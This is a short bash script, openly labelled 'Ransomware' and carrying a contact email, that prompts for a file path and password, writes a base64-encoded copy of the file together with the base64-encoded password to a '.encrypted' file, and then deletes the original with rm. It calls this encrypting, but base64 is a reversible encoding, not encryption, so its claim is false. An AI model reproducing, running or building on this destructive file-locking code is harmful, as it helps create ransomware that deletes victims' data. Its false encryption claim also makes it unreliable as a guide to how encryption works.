#!/bin/bash
clear;
echo "
################
#  Ransomware  # Contact : developerpaceusa@gmail.com
################";
echo "";
read -p "File Path : " pathfile;
read -p "Password  : " password;
sleep 2
echo "#########################";
echo "File Path => $pathfile";
sleep 0.5
echo "Password  => $password";
sleep 0.5
echo "#########################";
sleep 0.5
echo "Encrypting...";
sleep 2
content="$(cat $pathfile)";
encrypt="$(echo ${content} | base64)";
pass2="$(echo $password | base64)";
echo "content='${encrypt}'; pass='${pass2}';" >> "$pathfile.encrypted";
rm $pathfile;
sleep 2
echo "[+] Success!";
